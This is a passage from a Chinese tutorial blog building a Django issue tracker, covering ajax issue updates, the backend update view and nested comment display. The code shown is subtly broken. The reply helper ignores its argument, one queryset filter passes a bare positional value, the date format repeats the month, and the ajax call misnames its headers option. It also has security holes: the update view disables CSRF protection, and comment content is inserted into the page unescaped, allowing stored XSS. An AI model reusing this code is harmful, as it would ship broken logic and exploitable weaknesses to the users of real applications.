'plugin/editor-md/editormd.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/bootstrap-datepicker/js/bootstrap-datepicker.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/bootstrap-datepicker/locales/bootstrap-datepicker.zh-CN.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/bootstrap-select/js/bootstrap-select.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/bootstrap-select/js/i18n/defaults-zh_CN.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">/* 上传图片 */</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> WIKI_UPLOAD_URL = <span class="string">"&#123;% url 'wiki_upload' project_id=request.tracer.project.id%&#125;"</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">/* 问题更新 */</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> ISSUES_CHANGE_URL = <span class="string">"&#123;% url 'issues_change' project_id=request.tracer.project.id issues_id=issues_obj.id %&#125;"</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">/* markdown编辑器 */</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> EDITOR;</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="javascript">        $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">            initDatePicker();</span><br><span class="line">            initEditorMd();</span><br><span class="line">            initIssuesRecord();</span><br><span class="line">            bindReply();</span><br><span class="line">            bindCancelReplyUser();</span><br><span class="line">            bindSubmit();</span><br><span class="line">            bindChangeIssues();</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line"><span class="actionscript">        <span class="comment">/* 日期选择器 */</span></span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">initDatePicker</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            $(<span class="string">'#id_start_date,#id_end_date'</span>).datepicker(&#123;</span></span><br><span class="line"><span class="actionscript">                format: <span class="string">'yyyy-mm-dd'</span>,</span></span><br><span class="line"><span class="actionscript">                startData: <span class="string">'0'</span>,</span></span><br><span class="line"><span class="actionscript">                language: <span class="string">"zh-CN"</span>,</span></span><br><span class="line"><span class="actionscript">                autoclose: <span class="literal">true</span>,</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        /*</span><br><span class="line">         初始化markdown编辑器(textare转为编辑器）</span><br><span class="line">         */</span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">initEditorMd</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            EDITOR = editormd(<span class="string">'editor'</span>, &#123;   <span class="comment">// EDITOR前面没写var为全局变量</span></span></span><br><span class="line"><span class="actionscript">                placeholder: <span class="string">"请输入内容"</span>,</span></span><br><span class="line">                height: 300,</span><br><span class="line"><span class="actionscript">                path: <span class="string">"&#123;% static 'plugin/editor-md/lib/' %&#125;"</span>,</span></span><br><span class="line"><span class="actionscript">                imageUpload: <span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">                imageFormats: [<span class="string">"jpg"</span>, <span class="string">"jpeg"</span>, <span class="string">"png"</span>, <span class="string">"gif"</span>],</span></span><br><span class="line">                imageUploadURL: WIKI_UPLOAD_URL,</span><br><span class="line"><span class="actionscript">                toolbarAutoFixed: <span class="literal">false</span>, <span class="comment">//不固定窗口</span></span></span><br><span class="line"><span class="actionscript">                toolbarIcons: <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123; <span class="comment">// 显示部分按钮</span></span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">return</span> [<span class="string">'bold'</span>, <span class="string">'hr'</span>, <span class="string">'del'</span>, <span class="string">'italic'</span>, <span class="string">'quote'</span>, <span class="string">'|'</span>, <span class="string">'image'</span>, <span class="string">'preview'</span>, <span class="string">'watch'</span>, <span class="string">'fullscreen'</span>, <span class="string">'||'</span>, <span class="string">'save'</span>]</span></span><br><span class="line">                &#125;,</span><br><span class="line"><span class="actionscript">                toolbarCustomIcons: &#123;    <span class="comment">// 自定义按钮</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    save: "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'button'</span> <span class="attr">value</span>=<span class="string">'保 存'</span> <span class="attr">class</span>=<span class="string">'btn btn-success btn-sm'</span> <span class="attr">onclick</span>=<span class="string">'saveDesc();'</span> /&gt;</span>"</span></span></span><br><span class="line">                &#125;,</span><br><span class="line"><span class="actionscript">                onload: <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;    <span class="comment">// 显示文本内容模式</span></span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">this</span>.previewing();</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="actionscript">        <span class="comment">/* 问题更新 */</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">/* 问题更新触发ajax请求 */</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">/* 问题评论初始化 */</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">/* 创建操作记录节点 */</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">/* 问题回复 */</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">/* 取消回复 */</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">/* 点击评论 */</span></span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span>    </span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h4 id="12-6-5-问题更新-amp-问题更新触发ajax请求"><a href="#12-6-5-问题更新-amp-问题更新触发ajax请求" class="headerlink" title="12.6.5 问题更新 &amp; 问题更新触发ajax请求"></a>12.6.5 问题更新 &amp; 问题更新触发ajax请求</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 问题更新 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bindChangeIssues</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">'#editForm'</span>).find(<span class="string">'.form-control'</span>).change(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 内容变更</span></span><br><span class="line">        <span class="keyword">var</span> postDict = &#123;<span class="attr">name</span>: $(<span class="keyword">this</span>).attr(<span class="string">'name'</span>), <span class="attr">value</span>: $(<span class="keyword">this</span>).val()&#125;;</span><br><span class="line">        postAjaxData(postDict);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saveDesc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> postDict = &#123;<span class="attr">name</span>: <span class="string">'desc'</span>, <span class="attr">value</span>: EDITOR.getValue()&#125;;</span><br><span class="line">    postAjaxData(postDict);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 问题更新触发ajax请求 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">postAjaxData</span>(<span class="params">postDict</span>) </span>&#123;</span><br><span class="line">    $(<span class="string">'#id_'</span> + postDict.name).parent().next(<span class="string">'.error-msg'</span>).text(<span class="string">''</span>);</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: ISSUES_CHANGE_URL,</span><br><span class="line">        type: <span class="string">"POST"</span>,</span><br><span class="line">        header: &#123;    <span class="comment">// 自定义请求头，告诉后端为Json格式，可以不加。</span></span><br><span class="line">            <span class="string">"Content-Type"</span>: <span class="string">"application/json;charset=utf-8"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        data: <span class="built_in">JSON</span>.stringify(postDict),</span><br><span class="line">        dataType: <span class="string">"JSON"</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (res.status) &#123;</span><br><span class="line">                createRecordNode(res.data);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $(<span class="string">'#id_'</span> + postDict.name).parent().next(<span class="string">'.error-msg'</span>).text(res.error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="12-6-6-后端更新问题"><a href="#12-6-6-后端更新问题" class="headerlink" title="12.6.6 后端更新问题"></a>12.6.6 后端更新问题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@csrf_exempt</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">issues_change</span><span class="params">(request, project_id, issues_id)</span>:</span></span><br><span class="line">    <span class="string">""" 更新问题 """</span></span><br><span class="line">    issues_obj = models.Issues.objects.filter(id=issues_id, project_id=project_id).first()</span><br><span class="line"></span><br><span class="line">    post_dict = json.loads(request.body.decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    &#123;'name': 'issues_type', 'value': '2'&#125;</span></span><br><span class="line"><span class="string">    &#123;'name': 'status', 'value': '2'&#125;</span></span><br><span class="line"><span class="string">    &#123;'name': 'priority', 'value': 'warning'&#125;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    name = post_dict.get(<span class="string">'name'</span>)</span><br><span class="line">    value = post_dict.get(<span class="string">'value'</span>)</span><br><span class="line">    print(post_dict)</span><br><span class="line">    field_obj = models.Issues._meta.get_field(name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_reply_record</span><span class="params">(content)</span>:</span></span><br><span class="line">        new_obj = models.IssuesReply.objects.create(</span><br><span class="line">            reply_type=<span class="number">1</span>,</span><br><span class="line">            issues=issues_obj,</span><br><span class="line">            content=change_record,</span><br><span class="line">            creator=request.tracer.user,</span><br><span class="line">        )</span><br><span class="line">        new_data = &#123;</span><br><span class="line">            <span class="string">'id'</span>: new_obj.id,</span><br><span class="line">            <span class="string">'reply_type_text'</span>: new_obj.get_reply_type_display(),</span><br><span class="line">            <span class="string">'content'</span>: new_obj.content,</span><br><span class="line">            <span class="string">'creator'</span>: new_obj.creator.username,</span><br><span class="line">            <span class="string">'datetime'</span>: new_obj.create_datetime.strftime(<span class="string">'%Y-%m-%m %H:%M'</span>),</span><br><span class="line">            <span class="string">'parent_id'</span>: new_obj.reply_id,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> new_data</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 数据库字段更新</span></span><br><span class="line">    <span class="comment"># 1.1 文本</span></span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">in</span> [<span class="string">'subject'</span>, <span class="string">'desc'</span>, <span class="string">'start_date'</span>, <span class="string">'end_date'</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> value:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> field_obj.null:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'error'</span>: <span class="string">'该字段不能为空'</span>&#125;)</span><br><span class="line">            setattr(issues_obj, name, <span class="literal">None</span>)</span><br><span class="line">            issues_obj.save()</span><br><span class="line">            change_record = <span class="string">"&#123;&#125;更新为空"</span>.format(field_obj.verbose_name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            setattr(issues_obj, name, value)</span><br><span class="line">            issues_obj.save()</span><br><span class="line">            change_record = <span class="string">"&#123;&#125;更新为&#123;&#125;"</span>.format(field_obj.verbose_name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>, <span class="string">'data'</span>: create_reply_record(change_record)&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1.2 FK字段(指派要判断是否是创建者或者是参与者)</span></span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">in</span> [<span class="string">'issues_type'</span>, <span class="string">'module'</span>, <span class="string">'assign'</span>, <span class="string">'parent'</span>]:</span><br><span class="line">        <span class="comment"># 用户选择为空</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> value:</span><br><span class="line">            <span class="comment"># 不允许为空</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> field_obj.null:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'error'</span>: <span class="string">'该字段不能为空'</span>&#125;)</span><br><span class="line">            <span class="comment"># 允许为空</span></span><br><span class="line">            setattr(issues_obj, name, <span class="literal">None</span>)</span><br><span class="line">            issues_obj.save()</span><br><span class="line">            change_record = <span class="string">"&#123;&#125;更新为空"</span>.format(field_obj.verbose_name)</span><br><span class="line">        <span class="comment"># 用户输入不为空</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> name == <span class="string">'assign'</span>:</span><br><span class="line">                <span class="comment"># 是否是创建者</span></span><br><span class="line">                <span class="keyword">if</span> value == str(request.tracer.project.creator_id):</span><br><span class="line">                    instance = request.tracer.project.creator</span><br><span class="line">                <span class="comment"># 是否是参与者</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    project_user_obj = models.ProjectUser.objects.filter(project_id, user_id=value).first()</span><br><span class="line">                    <span class="keyword">if</span> project_user_obj:</span><br><span class="line">                        instance = project_user_obj.user</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        instance = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> instance:</span><br><span class="line">                    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'error'</span>: <span class="string">'该值不能存在'</span>&#125;)</span><br><span class="line"></span><br><span class="line">                setattr(issues_obj, name, instance)</span><br><span class="line">                issues_obj.save()</span><br><span class="line">                change_record = <span class="string">"&#123;&#125;更新为&#123;&#125;"</span>.format(field_obj.verbose_name, str(instance))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 条件判断：用户输入的值是自己的</span></span><br><span class="line">                <span class="comment"># field_obj.rel.model获取外键的to的值然后查询</span></span><br><span class="line">                instance = field_obj.rel.model.objects.filter(id=value, project_id=project_id).first()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> instance:</span><br><span class="line">                    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'error'</span>: <span class="string">'该值不能存在'</span>&#125;)</span><br><span class="line"></span><br><span class="line">                setattr(issues_obj, name, instance)</span><br><span class="line">                issues_obj.save()</span><br><span class="line">                change_record = <span class="string">"&#123;&#125;更新为&#123;&#125;"</span>.format(field_obj.verbose_name, str(instance))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>, <span class="string">'data'</span>: create_reply_record(change_record)&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1.5 choices字段</span></span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">in</span> [<span class="string">'priority'</span>, <span class="string">'mode'</span>, <span class="string">'status'</span>]:</span><br><span class="line">        selected_text = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> key, text <span class="keyword">in</span> field_obj.choices:</span><br><span class="line">            <span class="keyword">if</span> str(key) == value:</span><br><span class="line">                selected_text = text</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> selected_text:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'error'</span>: <span class="string">'该值不存在'</span>&#125;)</span><br><span class="line">        setattr(issues_obj, name, value)</span><br><span class="line">        issues_obj.save()</span><br><span class="line">        change_record = <span class="string">"&#123;&#125;更新为&#123;&#125;"</span>.format(field_obj.verbose_name, selected_text)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>, <span class="string">'data'</span>: create_reply_record(change_record)&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1.6 M2M字段</span></span><br><span class="line">    <span class="keyword">if</span> name == <span class="string">"attention"</span>:</span><br><span class="line">        <span class="comment"># &#123;"name":"attention",value:[1,2,3]&#125;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, list):  <span class="comment"># isinstance列表类型</span></span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'error'</span>: <span class="string">'数据格式错误'</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> value:</span><br><span class="line">            issues_obj.attention.set([])</span><br><span class="line">            issues_obj.save()</span><br><span class="line">            change_record = <span class="string">"&#123;&#125;更新为空"</span>.format(field_obj.verbose_name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># values=[1,2,3,4]  id 是否是项目成员，包括创建者和参与者</span></span><br><span class="line">            <span class="comment"># 获取当前项目的所有成员</span></span><br><span class="line">            user_dict = &#123;str(request.tracer.project.creator_id): request.tracer.project.creator.username&#125;</span><br><span class="line">            project_user_list = models.ProjectUser.objects.filter(project_id=project_id)</span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> project_user_list:</span><br><span class="line">                user_dict[str(item.user_id)] = item.user.username</span><br><span class="line"></span><br><span class="line">            username_list = []</span><br><span class="line">            <span class="keyword">for</span> user_id <span class="keyword">in</span> value:</span><br><span class="line">                username = user_dict.get(str(user_id))</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">                    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'error'</span>: <span class="string">'用户不存在请重新设置'</span>&#125;)</span><br><span class="line">                username_list.append(username)</span><br><span class="line"></span><br><span class="line">            issues_obj.attention.set(value)</span><br><span class="line">            issues_obj.save()</span><br><span class="line">            change_record = <span class="string">"&#123;&#125;更新为&#123;&#125;"</span>.format(field_obj.verbose_name, <span class="string">','</span>.join(username_list))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>, <span class="string">'data'</span>: create_reply_record(change_record)&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'error'</span>: <span class="string">'滚'</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="12-7-问题讨论（回复嵌套）"><a href="#12-7-问题讨论（回复嵌套）" class="headerlink" title="12.7 问题讨论（回复嵌套）"></a>12.7 问题讨论（回复嵌套）</h3><h4 id="12-7-1-构造问题评论的url-地址"><a href="#12-7-1-构造问题评论的url-地址" class="headerlink" title="12.7.1 构造问题评论的url 地址"></a>12.7.1 构造问题评论的url 地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># 问题管理</span></span><br><span class="line">...</span><br><span class="line">    <span class="comment"># 编辑问题</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 问题更新</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 问题讨论</span></span><br><span class="line">    url(<span class="string">r'^issues/record/(?P&lt;issues_id&gt;\d+)/$'</span>, issues.issues_record, name=<span class="string">'issues_record'</span>),</span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure><h4 id="12-7-2-问题评论初始化，发送ajax请求"><a href="#12-7-2-问题评论初始化，发送ajax请求" class="headerlink" title="12.7.2 问题评论初始化，发送ajax请求"></a>12.7.2 问题评论初始化，发送ajax请求</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 问题评论</span></span><br><span class="line"><span class="keyword">var</span> ISSUES_RECORD_URL = <span class="string">"&#123;% url 'issues_record' project_id=request.tracer.project.id issues_id=issues_obj.id%&#125;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 问题评论的初始化</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initIssuesRecord</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: ISSUES_RECORD_URL,</span><br><span class="line">        type: <span class="string">"GET"</span>,</span><br><span class="line">        dataType: <span class="string">"JSON"</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (res.status) &#123;</span><br><span class="line">                $.each(res.data, <span class="function"><span class="keyword">function</span> (<span class="params">index, item</span>) </span>&#123;</span><br><span class="line">                    createRecordNode(item);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="12-7-3-js嵌套展示问题评论"><a href="#12-7-3-js嵌套展示问题评论" class="headerlink" title="12.7.3 js嵌套展示问题评论"></a>12.7.3 js嵌套展示问题评论</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建操作记录节点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createRecordNode</span>(<span class="params">nodeDict</span>) </span>&#123; <span class="comment">//nodeDict后端发过来的数据</span></span><br><span class="line">    <span class="keyword">var</span> $item = $(<span class="string">"#recordTemplate"</span>).find(<span class="string">'.item'</span>).clone();<span class="comment">// 复制模板</span></span><br><span class="line">    $item.find(<span class="string">'.left-avatar'</span>).html(nodeDict.creator[<span class="number">0</span>].toUpperCase());</span><br><span class="line">    $item.find(<span class="string">'pre'</span>).html(nodeDict.content);</span><br><span class="line">    $item.find(<span class="string">'.user'</span>).html(nodeDict.creator);</span><br><span class="line">    $item.find(<span class="string">'.type'</span>).html(nodeDict.reply_type_text);</span><br><span class="line">    $item.find(<span class="string">'.date'</span>).html(nodeDict.datetime);</span><br><span class="line">    $item.attr(&#123;<span class="attr">id</span>: nodeDict.id, <span class="attr">username</span>: nodeDict.creator&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nodeDict.parent_id) &#123;</span><br><span class="line">        <span class="comment">// 挂在谁下</span></span><br><span class="line">        $(<span class="string">'#'</span> + nodeDict.parent_id).children(<span class="string">'.child'</span>).append($item);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 根下</span></span><br><span class="line">        $(<span class="string">'.comment-list'</span>).append($item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="12-7-4-后端处理"><a href="#12-7-4-后端处理" class="headerlink" title="12.7.4 后端处理"></a>12.7.4 后端处理</h4><figure class="highlight python"><table><tr><td 